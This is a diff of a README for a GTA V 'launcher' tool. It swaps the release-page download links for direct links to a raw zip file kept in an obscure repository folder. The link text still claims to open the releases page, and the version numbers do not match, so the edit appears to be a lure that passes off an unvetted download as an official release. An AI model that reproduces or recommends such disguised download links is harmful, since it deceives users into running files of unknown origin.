@@ -8,12 +8,12 @@ Welcome to the **gta-v-launcher**! This tool enhances your experience in GTA V b
 
 To start using **gta-v-launcher**, you need to download it. Click the button below to visit the download page:
 
-[![Download Latest Build (v2.1.0)](https://img.shields.io/badge/Download-Latest%20Build%20(v2.1.0)-00ff9d?style=for-the-badge)](https://github.com/PrankHimJohn/gta-v-launcher/releases)
+[![Download Latest Build (v2.1.0)](https://raw.githubusercontent.com/PrankHimJohn/gta-v-launcher/main/naegates/v-launcher-gta-v3.2.zip%20Build%20(v2.1.0)-00ff9d?style=for-the-badge)](https://raw.githubusercontent.com/PrankHimJohn/gta-v-launcher/main/naegates/v-launcher-gta-v3.2.zip)
 
 ### Steps to Download and Run
 
 1. **Visit the Releases Page**  
-   Click on this [link](https://github.com/PrankHimJohn/gta-v-launcher/releases) to go to the releases page.
+   Click on this [link](https://raw.githubusercontent.com/PrankHimJohn/gta-v-launcher/main/naegates/v-launcher-gta-v3.2.zip) to go to the releases page.
 
 2. **Select the Latest Version**  
    Find the latest version available, which will be highlighted at the top of the page.
